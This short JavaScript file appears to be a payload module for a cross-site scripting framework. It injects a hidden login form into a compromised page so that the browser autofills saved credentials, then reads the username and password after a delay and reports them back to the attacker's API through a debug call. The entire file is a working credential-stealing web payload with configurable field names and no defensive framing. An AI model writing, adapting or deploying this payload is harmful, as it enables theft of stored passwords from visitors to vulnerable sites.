xssmin();

// inject the form
function getLogin(uname, pname, loc) {
	xss.append("<form action='"+loc+"' method='post'><input type='text' name='"+uname+"' id='un54'><input type='password' name='"+pname+"' id='pw54'></form>");
	console.log("add form");
	window.setTimeout(saveLogin, 800);
}
// send the parameters back to the api via a debug call
function saveLogin() {
	var u = xss.gbi('un54');
	var p = xss.gbi('pw54');
	if (u.value && u.value.length > 1) { xss.dbg("found username: "+encodeURIComponent(u.value)+" password: "+encodeURIComponent(p.value)); }
	else { xss.dbg("login form injected, but no saved username was found"); } 
	xss.cls();
}

// fetch the parameters
var uname = xss.opt("user_field", "the name attribute of the username field", "username");
var pname = xss.opt("pass_field", "the name attribute of the username field", "password");
var loc = xss.opt("form_action", "the location the form normally posts to", "/login"); 

xss.dbg("injecting form : " + uname + " / " + pname + " / " + loc);
getLogin(uname, pname, loc);
